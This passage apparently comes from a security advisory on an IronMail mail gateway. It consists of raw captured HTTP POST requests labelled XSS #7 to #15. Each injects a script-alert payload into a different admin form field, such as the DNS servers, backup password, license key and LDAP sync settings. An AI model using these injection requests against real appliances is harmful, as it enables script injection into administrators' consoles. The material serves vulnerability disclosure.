CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DsaveNew;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nRmtu=1500&hostName=mmail11&domainName=sytes.net&ipAddress=10.1.1.1&ipNetMask=255.255.255.224&defaultRouter=10.1.1.2&dns1=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&dns2=10.1.1.4&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:41 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #7 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=saveNew\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 340\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3Fmethod%3DsaveNew;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nTmtu=1500&hostName=mmail11&domainName=sytes.net&ipAddress=10.1.1.1&ipNetMask=255.255.255.224&defaultRouter=10.1.1.2&dns1=10.1.1.3&dns2=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&dns3=10.1.1.5&ntp1=time.nist.gov&ntp2=bitsy.mit.edu&ntp3=clock.isc.org&timeZone=Europe%2FMadrid&ethernetSetting=autoselect&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:48 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n\n.: [ XSS #8 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemOutOfBand.do?method=saveNew HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemOutOfBand.do?method=getDetail&isMenuToggled=1\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 154\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/systemOutOfBand.do%3Fmethod%3DgetDetail%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\noutOfBand=true&mtu=1500&ipAddress=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&ethernetSetting=autoselect&ipNetMask=255.255.255.224&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:13:16 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #9 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemBackup.do?method=submit HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemBackup.do?method=init&isMenuToggled=1\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 146\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/systemBackup.do%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\npassword=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&confirmPassword=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:13:41 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #10 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemLicenseManager.do?method=submit\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemLicenseManager.do?method=init&isMenuToggled=1\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 75\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=17;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/systemLicenseManager.do%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nKlicense=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&submit=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:20:28 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #11 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemWebAdminConfig.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemWebAdminConfig.do?method=init&isMenuToggled=1&procId=90\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 1225\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=15;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/systemWebAdminConfig.do%3Fmethod%3Dinit%26isMenuToggled%3D1%26procId%3D90;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2C;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=90&rows%5B0%5D.attrName=gui_log_level&rows%5B0%5D.attrType=12&rows%5B0%5D.attrValidate=%5BLabelValueBean%5BCRITICAL%2C+1%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BINFORMATION%2C+5%5D%2C+LabelValueBean%5BDETAILED%2C+6%5D%5D&rows%5B0%5D.attrValidateStr=30060003%3A1%2C30060004%3A4%2C30060005%3A5%2C30060006%3A6&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=4&rows%5B0%5D.langTagId=2000003&rows%5B0%5D.attrValue=4&rows%5B1%5D.attrName=gui_timeout&rows%5B1%5D.attrType=2&rows%5B1%5D.attrValidate=%5B1-30%5D&rows%5B1%5D.attrValidateStr=%5B1-30%5D&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=30&rows%5B1%5D.langTagId=2001014&rows%5B1%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B2%5D.attrName=auto_refresh&rows%5B2%5D.attrType=2&rows%5B2%5D.attrValidate=%5B1-30%5D&rows%5B2%5D.attrValidateStr=%5B1-30%5D&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=0&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=4&rows%5B2%5D.langTagId=2001017&rows%5B2%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA2%27%29%3C%2Fscript%3E&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:21:27 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #12 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=init&procId=164\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2840\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/ldap_ConfigureServiceProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=164&rows%5B0%5D.attrName=sync_time&rows%5B0%5D.attrType=2&rows%5B0%5D.attrValidate=%5B1-24%5D&rows%5B0%5D.attrValidateStr=%5B1-24%5D&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=24&rows%5B0%5D.langTagId=2016401&rows%5B0%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B1%5D.attrName=sync_results_count&rows%5B1%5D.attrType=2&rows%5B1%5D.attrValidate=%5B1-500%5D&rows%5B1%5D.attrValidateStr=%5B1-500%5D&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=50&rows%5B1%5D.langTagId=2016402&rows%5B1%5D.attrValueStr=50&rows%5B2%5D.attrName=sync_rules_order&rows%5B2%5D.attrType=1&rows%5B2%5D.attrValidate=&rows%5B2%5D.attrValidateStr=&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=1&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=&rows%5B2%5D.langTagId=2016403&rows%5B2%5D.attrValue=&rows%5B3%5D.attrName=ldap_fail_open&rows%5B3%5D.attrType=5&rows%5B3%5D.attrValidate=&rows%5B3%5D.attrValidateStr=&rows%5B3%5D.attrDepends=&rows%5B3%5D.multipleValue=0&rows%5B3%5D.modifyable=true&rows%5B3%5D.attrValueStrClone=1&rows%5B3%5D.langTagId=2016404&rows%5B3%5D.attrValue=true&rows%5B4%5D.attrName=ldap_failure_count&rows%5B4%5D.attrType=2&rows%5B4%5D.attrValidate=%5B1-50%5D&rows%5B4%5D.attrValidateStr=%5B1-50%5D&rows%5B4%5D.attrDepends=&rows%5B4%5D.multipleValue=0&rows%5B4%5D.modifyable=true&rows%5B4%5D.attrValueStrClone=3&rows%5B4%5D.langTagId=2016405&rows%5B4%5D.attrValueStr=3&rows%5B5%5D.attrName=ldap_monitor_intvl&rows%5B5%5D.attrType=2&rows%5B5%5D.attrValidate=%5B1-1440%5D&rows%5B5%5D.attrValidateStr=%5B1-1440%5D&rows%5B5%5D.attrDepends=&rows%5B5%5D.multipleValue=0&rows%5B5%5D.modifyable=true&rows%5B5%5D.attrValueStrClone=5&rows%5B5%5D.langTagId=2016406&rows%5B5%5D.attrValueStr=5&rows%5B6%5D.attrName=ldap_alert_type&rows%5B6%5D.attrType=12&rows%5B6%5D.attrValidate=%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+LabelValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+LabelValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+LabelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=30060019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C30060009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=&rows%5B6%5D.multipleValue=0&rows%5B6%5D.modifyable=true&rows%5B6%5D.attrValueStrClone=3&rows%5B6%5D.langTagId=2016407&rows%5B6%5D.attrValue=3&rows%5B7%5D.attrName=ldap_route_aft_masq&rows%5B7%5D.attrType=5&rows%5B7%5D.attrValidate=&rows%5B7%5D.attrValidateStr=&rows%5B7%5D.attrDepends=&rows%5B7%5D.multipleValue=0&rows%5B7%5D.modifyable=true&rows%5B7%5D.attrValueStrClone=0&rows%5B7%5D.langTagId=2016408&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:22:51 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #13 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2840\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/ldap_ConfigureServiceProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=164&rows%5B0%5D.attrName=sync_time&rows%5B0%5D.attrType=2&rows%5B0%5D.attrValidate=%5B1-24%5D&rows%5B0%5D.attrValidateStr=%5B1-24%5D&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=24&rows%5B0%5D.langTagId=2016401&rows%5B0%5D.attrValueStr=24&rows%5B1%5D.attrName=sync_results_count&rows%5B1%5D.attrType=2&rows%5B1%5D.attrValidate=%5B1-500%5D&rows%5B1%5D.attrValidateStr=%5B1-500%5D&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=50&rows%5B1%5D.langTagId=2016402&rows%5B1%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B2%5D.attrName=sync_rules_order&rows%5B2%5D.attrType=1&rows%5B2%5D.attrValidate=&rows%5B2%5D.attrValidateStr=&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=1&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=&rows%5B2%5D.langTagId=2016403&rows%5B2%5D.attrValue=&rows%5B3%5D.attrName=ldap_fail_open&rows%5B3%5D.attrType=5&rows%5B3%5D.attrValidate=&rows%5B3%5D.attrValidateStr=&rows%5B3%5D.attrDepends=&rows%5B3%5D.multipleValue=0&rows%5B3%5D.modifyable=true&rows%5B3%5D.attrValueStrClone=1&rows%5B3%5D.langTagId=2016404&rows%5B3%5D.attrValue=true&rows%5B4%5D.attrName=ldap_failure_count&rows%5B4%5D.attrType=2&rows%5B4%5D.attrValidate=%5B1-50%5D&rows%5B4%5D.attrValidateStr=%5B1-50%5D&rows%5B4%5D.attrDepends=&rows%5B4%5D.multipleValue=0&rows%5B4%5D.modifyable=true&rows%5B4%5D.attrValueStrClone=3&rows%5B4%5D.langTagId=2016405&rows%5B4%5D.attrValueStr=3&rows%5B5%5D.attrName=ldap_monitor_intvl&rows%5B5%5D.attrType=2&rows%5B5%5D.attrValidate=%5B1-1440%5D&rows%5B5%5D.attrValidateStr=%5B1-1440%5D&rows%5B5%5D.attrDepends=&rows%5B5%5D.multipleValue=0&rows%5B5%5D.modifyable=true&rows%5B5%5D.attrValueStrClone=5&rows%5B5%5D.langTagId=2016406&rows%5B5%5D.attrValueStr=5&rows%5B6%5D.attrName=ldap_alert_type&rows%5B6%5D.attrType=12&rows%5B6%5D.attrValidate=%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+LabelValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+LabelValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+LabelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=30060019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C30060009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=&rows%5B6%5D.multipleValue=0&rows%5B6%5D.modifyable=true&rows%5B6%5D.attrValueStrClone=3&rows%5B6%5D.langTagId=2016407&rows%5B6%5D.attrValue=3&rows%5B7%5D.attrName=ldap_route_aft_masq&rows%5B7%5D.attrType=5&rows%5B7%5D.attrValidate=&rows%5B7%5D.attrValidateStr=&rows%5B7%5D.attrDepends=&rows%5B7%5D.multipleValue=0&rows%5B7%5D.modifyable=true&rows%5B7%5D.attrValueStrClone=0&rows%5B7%5D.langTagId=2016408&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:22:56 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #14 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2842\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/ldap_ConfigureServiceProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=164&rows%5B0%5D.attrName=sync_time&rows%5B0%5D.attrType=2&rows%5B0%5D.attrValidate=%5B1-24%5D&rows%5B0%5D.attrValidateStr=%5B1-24%5D&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=24&rows%5B0%5D.langTagId=2016401&rows%5B0%5D.attrValueStr=24&rows%5B1%5D.attrName=sync_results_count&rows%5B1%5D.attrType=2&rows%5B1%5D.attrValidate=%5B1-500%5D&rows%5B1%5D.attrValidateStr=%5B1-500%5D&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=50&rows%5B1%5D.langTagId=2016402&rows%5B1%5D.attrValueStr=50&rows%5B2%5D.attrName=sync_rules_order&rows%5B2%5D.attrType=1&rows%5B2%5D.attrValidate=&rows%5B2%5D.attrValidateStr=&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=1&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=&rows%5B2%5D.langTagId=2016403&rows%5B2%5D.attrValue=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B3%5D.attrName=ldap_fail_open&rows%5B3%5D.attrType=5&rows%5B3%5D.attrValidate=&rows%5B3%5D.attrValidateStr=&rows%5B3%5D.attrDepends=&rows%5B3%5D.multipleValue=0&rows%5B3%5D.modifyable=true&rows%5B3%5D.attrValueStrClone=1&rows%5B3%5D.langTagId=2016404&rows%5B3%5D.attrValue=true&rows%5B4%5D.attrName=ldap_failure_count&rows%5B4%5D.attrType=2&rows%5B4%5D.attrValidate=%5B1-50%5D&rows%5B4%5D.attrValidateStr=%5B1-50%5D&rows%5B4%5D.attrDepends=&rows%5B4%5D.multipleValue=0&rows%5B4%5D.modifyable=true&rows%5B4%5D.attrValueStrClone=3&rows%5B4%5D.langTagId=2016405&rows%5B4%5D.attrValueStr=3&rows%5B5%5D.attrName=ldap_monitor_intvl&rows%5B5%5D.attrType=2&rows%5B5%5D.attrValidate=%5B1-1440%5D&rows%5B5%5D.attrValidateStr=%5B1-1440%5D&rows%5B5%5D.attrDepends=&rows%5B5%5D.multipleValue=0&rows%5B5%5D.modifyable=true&rows%5B5%5D.attrValueStrClone=5&rows%5B5%5D.langTagId=2016406&rows%5B5%5D.attrValueStr=5&rows%5B6%5D.attrName=ldap_alert_type&rows%5B6%5D.attrType=12&rows%5B6%5D.attrValidate=%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+LabelValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+LabelValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+LabelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=30060019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C30060009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=&rows%5B6%5D.multipleValue=0&rows%5B6%5D.modifyable=true&rows%5B6%5D.attrValueStrClone=3&rows%5B6%5D.langTagId=2016407&rows%5B6%5D.attrValue=3&rows%5B7%5D.attrName=ldap_route_aft_masq&rows%5B7%5D.attrType=5&rows%5B7%5D.attrValidate=&rows%5B7%5D.attrValidateStr=&rows%5B7%5D.attrDepends=&rows%5B7%5D.multipleValue=0&rows%5B7%5D.modifyable=true&rows%5B7%5D.attrValueStrClone=0&rows%5B7%5D.langTagId=2016408&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:00 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #15 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=init&procId=164\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2842\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/ldap_ConfigureServiceProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=164&rows%5B0%5D.attrName=sync_time&rows%5B0%5D.attrType=2&rows%5B0%5D.attrValidate=%5B1-24%5D&rows%5B0%5D.attrValidateStr=%5B1-24%5D&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=24&rows%5B0%5D.langTagId=2016401&rows%5B0%5D.attrValueStr=24&rows%5B1%5D.attrName=sync_results_count&rows%5B1%5D.attrType=2&rows%5B1%5D.attrValidate=%5B1-500%5D&rows%5B1%5D.attrValidateStr=%5B1-500%5D&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=50&rows%5B1%5D.langTagId=2016402&rows%5B1%5D.attrValueStr=50&rows%5B2%5D.attrName=sync_rules_order&rows%5B2%5D.attrType=1&rows%5B2%5D.attrValidate=&rows%5B2%5D.attrValidateStr=&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=1&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B2%5D.langTagId=2016403&rows%5B2%5D.attrValue=&rows%5B3%5D.attrName=ldap_fail_open&rows%5B3%5D.attrType=5&rows%5B3%5D.attrValidate=&rows%5B3%5D.attrValidateStr=&rows%5B3%5D.attrDepends=&rows%5B3%5D.multipleValue=0&rows%5B3%5D.modifyable=true&rows%5B3%5D.attrValueStrClone=1&rows%5B3%5D.langTagId=2016404&r